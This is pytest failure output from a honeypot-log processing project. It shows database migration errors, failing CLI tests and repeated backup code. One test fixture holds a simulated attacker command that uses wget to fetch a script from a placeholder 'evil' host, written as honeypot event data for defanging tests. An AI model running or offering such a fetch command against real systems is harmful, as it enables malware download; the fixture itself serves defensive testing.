            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___________ TestBackwardCompatibility.test_existing_tests_still_pass ___________

self = <test_bulk_loader_defanging.TestBackwardCompatibility object at 0x7756b439e490>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_existing_tests_still_pass0')

    def test_existing_tests_still_pass(self, tmp_path: Path) -> None:
        """Test that existing functionality still works."""
        events = [
            {
                "session": "compat123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
                "sensor": "sensor-a",
            },
            {
                "session": "compat123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "wget http://evil /tmp/run.sh",
                "sensor": "sensor-a",
            },
        ]
        source = tmp_path / "compat_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:354: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77567cce0050>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:16,940:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:16,940:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:16,941:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:16,941:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:16,952:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:16,952:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:16,953:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:16,953:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:16,954:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:16,954:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:16,958:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:16,958:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:16,959:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:16,959:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:16,961:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:16,961:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:16,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:16,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:16,965:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:16,965:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:16,966:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:16,966:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:16,969:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:16,969:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:16,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:16,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:16,971:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:16,971:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:16,972:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,972:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,977:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:16,977:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__________________ TestCowrieDatabase.test_get_schema_version __________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b439f250>
temp_db = PosixPath('/tmp/tmpl5znn05h.db')

    def test_get_schema_version(self, temp_db) -> None:
        """Test getting schema version from database."""
        db = CowrieDatabase(str(temp_db))
        version = db.get_schema_version()
>       assert version == 2
E       assert 0 == 2

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:86: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:17,683:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
2025-10-18 18:32:17,683:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: Could not parse SQLAlchemy URL from given URL string
___________________ TestCowrieDatabase.test_validate_schema ____________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b430c9d0>
temp_db = PosixPath('/tmp/tmpmd9ohy34.db')

    def test_validate_schema(self, temp_db) -> None:
        """Test schema validation."""
        db = CowrieDatabase(str(temp_db))
        result = db.validate_schema()
    
>       assert result['is_valid'] is True
E       assert False is True

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:99: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:17,773:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
2025-10-18 18:32:17,773:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
2025-10-18 18:32:17,773:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_schema:Could not get table counts: Could not parse SQLAlchemy URL from given URL string
2025-10-18 18:32:17,773:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_schema:Could not get table counts: Could not parse SQLAlchemy URL from given URL string
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: Could not parse SQLAlchemy URL from given URL string
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:282 Could not get table counts: Could not parse SQLAlchemy URL from given URL string
___________________ TestCowrieDatabase.test_migrate_dry_run ____________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b430cb00>
temp_db = PosixPath('/tmp/tmp1nja9wrz.db')

    def test_migrate_dry_run(self, temp_db) -> None:
        """Test migration dry run."""
        db = CowrieDatabase(str(temp_db))
        result = db.migrate(dry_run=True)
    
        assert result['dry_run'] is True
>       assert result['current_version'] == 2
E       assert 0 == 2

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:113: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:17,854:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
2025-10-18 18:32:17,854:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: Could not parse SQLAlchemy URL from given URL string
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: Could not parse SQLAlchemy URL from given URL string
____________________ TestCowrieDatabase.test_create_backup _____________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b4353ad0>
temp_db = PosixPath('/tmp/tmpqch9scs_.db')

    def test_create_backup(self, temp_db) -> None:
        """Test database backup creation."""
        db = CowrieDatabase(str(temp_db))
>       backup_path = db.create_backup()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:120: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x77566ce59e50>
backup_path = None

    def create_backup(self, backup_path: Optional[str] = None) -> str:
        """Create a backup of the database.
    
        Args:
            backup_path: Custom backup location (None for auto-generated)
    
        Returns:
            Path to created backup file
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
        if self._is_sqlite():
            # SQLite backup using file copy
            db_path = self.db_url.replace("sqlite:///", "")
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_dir = Path(db_path).parent
                backup_file = backup_dir / f"cowrie_backup_{timestamp}.sqlite"
    
            # Copy SQLite file
            import shutil
    
            shutil.copy2(db_path, str(backup_file))
    
            # Verify backup integrity
            if not self._verify_backup_integrity(str(backup_file)):
                backup_file.unlink()
                raise Exception("Backup integrity check failed")
    
            return str(backup_file)
    
        elif self._is_postgresql():
            # PostgreSQL backup using pg_dump
            import subprocess
    
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_file = Path(f"cowrie_backup_{timestamp}.sql")
    
            # Extract connection details from URL
            # Format: postgresql://user:password@host:port/database
            url_parts = self.db_url.replace("postgresql://", "").replace("postgres://", "")
            if "@" in url_parts:
                auth, host_db = url_parts.split("@", 1)
                if ":" in auth:
                    user, password = auth.split(":", 1)
                else:
                    user = auth
                    password = ""
    
                if "/" in host_db:
                    host_port, database = host_db.split("/", 1)
                    if ":" in host_port:
                        host, port = host_port.split(":", 1)
                    else:
                        host = host_port
                        port = "5432"
                else:
                    host = host_db
                    port = "5432"
                    database = "postgres"
            else:
                # Simple format: postgresql://database
                user = "postgres"
                password = ""
                host = "localhost"
                port = "5432"
                database = url_parts
    
            # Set environment variables for pg_dump
            env = os.environ.copy()
            if password:
                env['PGPASSWORD'] = password
    
            # Run pg_dump
            cmd = [
                'pg_dump',
                '-h',
                host,
                '-p',
                port,
                '-U',
                user,
                '-d',
                database,
                '-f',
                str(backup_file),
                '--no-password',
            ]
    
            try:
                subprocess.run(cmd, env=env, check=True, capture_output=True)
                return str(backup_file)
            except subprocess.CalledProcessError as e:
                raise Exception(f"PostgreSQL backup failed: {e.stderr.decode()}")
        else:
>           raise Exception(f"Backup not supported for database type: {self.db_url}")
E           Exception: Backup not supported for database type: /tmp/tmpqch9scs_.db

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:468: Exception
______________ TestCowrieDatabase.test_create_backup_custom_path _______________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b4318380>
temp_db = PosixPath('/tmp/tmpbyaud7vl.db')

    def test_create_backup_custom_path(self, temp_db) -> None:
        """Test backup creation with custom path."""
        db = CowrieDatabase(str(temp_db))
        custom_path = str(temp_db.parent / "custom_backup.db")
>       backup_path = db.create_backup(custom_path)

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:135: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x77566ce5a930>
backup_path = '/tmp/custom_backup.db'

    def create_backup(self, backup_path: Optional[str] = None) -> str:
        """Create a backup of the database.
    
        Args:
            backup_path: Custom backup location (None for auto-generated)
    
        Returns:
            Path to created backup file
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
        if self._is_sqlite():
            # SQLite backup using file copy
            db_path = self.db_url.replace("sqlite:///", "")
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_dir = Path(db_path).parent
                backup_file = backup_dir / f"cowrie_backup_{timestamp}.sqlite"
    
            # Copy SQLite file
            import shutil
    
            shutil.copy2(db_path, str(backup_file))
    
            # Verify backup integrity
            if not self._verify_backup_integrity(str(backup_file)):
                backup_file.unlink()
                raise Exception("Backup integrity check failed")
    
            return str(backup_file)
    
        elif self._is_postgresql():
            # PostgreSQL backup using pg_dump
            import subprocess
    
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_file = Path(f"cowrie_backup_{timestamp}.sql")
    
            # Extract connection details from URL
            # Format: postgresql://user:password@host:port/database
            url_parts = self.db_url.replace("postgresql://", "").replace("postgres://", "")
            if "@" in url_parts:
                auth, host_db = url_parts.split("@", 1)
                if ":" in auth:
                    user, password = auth.split(":", 1)
                else:
                    user = auth
                    password = ""
    
                if "/" in host_db:
                    host_port, database = host_db.split("/", 1)
                    if ":" in host_port:
                        host, port = host_port.split(":", 1)
                    else:
                        host = host_port
                        port = "5432"
                else:
                    host = host_db
                    port = "5432"
                    database = "postgres"
            else:
                # Simple format: postgresql://database
                user = "postgres"
                password = ""
                host = "localhost"
                port = "5432"
                database = url_parts
    
            # Set environment variables for pg_dump
            env = os.environ.copy()
            if password:
                env['PGPASSWORD'] = password
    
            # Run pg_dump
            cmd = [
                'pg_dump',
                '-h',
                host,
                '-p',
                port,
                '-U',
                user,
                '-d',
                database,
                '-f',
                str(backup_file),
                '--no-password',
            ]
    
            try:
                subprocess.run(cmd, env=env, check=True, capture_output=True)
                return str(backup_file)
            except subprocess.CalledProcessError as e:
                raise Exception(f"PostgreSQL backup failed: {e.stderr.decode()}")
        else:
>           raise Exception(f"Backup not supported for database type: {self.db_url}")
E           Exception: Backup not supported for database type: /tmp/tmpbyaud7vl.db

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:468: Exception
____________ TestCowrieDatabase.test_verify_backup_integrity_valid _____________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b4318490>
temp_db = PosixPath('/tmp/tmpu3esjzjn.db')

    def test_verify_backup_integrity_valid(self, temp_db) -> None:
        """Test backup integrity verification with valid backup."""
        db = CowrieDatabase(str(temp_db))
>       backup_path = db.create_backup()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:143: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b31d78f0>
backup_path = None

    def create_backup(self, backup_path: Optional[str] = None) -> str:
        """Create a backup of the database.
    
        Args:
            backup_path: Custom backup location (None for auto-generated)
    
        Returns:
            Path to created backup file
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
        if self._is_sqlite():
            # SQLite backup using file copy
            db_path = self.db_url.replace("sqlite:///", "")
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_dir = Path(db_path).parent
                backup_file = backup_dir / f"cowrie_backup_{timestamp}.sqlite"
    
            # Copy SQLite file
            import shutil
    
            shutil.copy2(db_path, str(backup_file))
    
            # Verify backup integrity
            if not self._verify_backup_integrity(str(backup_file)):
                backup_file.unlink()
                raise Exception("Backup integrity check failed")
    
            return str(backup_file)
    
        elif self._is_postgresql():
            # PostgreSQL backup using pg_dump
            import subprocess
    
            if backup_path:
                backup_file = Path(backup_path)
            else:
                backup_file = Path(f"cowrie_backup_{timestamp}.sql")
    
            # Extract connection details from URL
            # Format: postgresql://user:password@host:port/database
            url_parts = self.db_url.replace("postgresql://", "").replace("postgres://", "")
            if "@" in url_parts:
                auth, host_db = url_parts.split("@", 1)
                if ":" in auth:
                    user, password = auth.split(":", 1)
                else:
                    user = auth
                    password = ""
    
                if "/" in host_db:
                    host_port, database = host_db.split("/", 1)
                    if ":" in host_port:
                        host, port = host_port.split(":", 1)
                    else:
                        host = host_port
                        port = "5432"
                else:
                    host = host_db
                    port = "5432"
                    database = "postgres"
            else:
                # Simple format: postgresql://database
                user = "postgres"
                password = ""
                host = "localhost"
                port = "5432"
                database = url_parts
    
            # Set environment variables for pg_dump
            env = os.environ.copy()
            if password:
                env['PGPASSWORD'] = password
    
            # Run pg_dump
            cmd = [
                'pg_dump',
                '-h',
                host,
                '-p',
                port,
                '-U',
                user,
                '-d',
                database,
                '-f',
                str(backup_file),
                '--no-password',
            ]
    
            try:
                subprocess.run(cmd, env=env, check=True, capture_output=True)
                return str(backup_file)
            except subprocess.CalledProcessError as e:
                raise Exception(f"PostgreSQL backup failed: {e.stderr.decode()}")
        else:
>           raise Exception(f"Backup not supported for database type: {self.db_url}")
E           Exception: Backup not supported for database type: /tmp/tmpu3esjzjn.db

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:468: Exception
___________________ TestCowrieDatabase.test_check_integrity ____________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b437d450>
temp_db = PosixPath('/tmp/tmpycyh5hfx.db')

    def test_check_integrity(self, temp_db) -> None:
        """Test database integrity check."""
        db = CowrieDatabase(str(temp_db))
>       result = db.check_integrity()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:150: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:520: in check_integrity
    with self._get_engine().connect() as conn:
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:64: in _get_engine
    self._engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/engine.py:120: in create_engine_from_settings
    engine = create_engine(url, connect_args=connect_args, **engine_kwargs)
<string>:2: in create_engine
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/deprecations.py:281: in warned
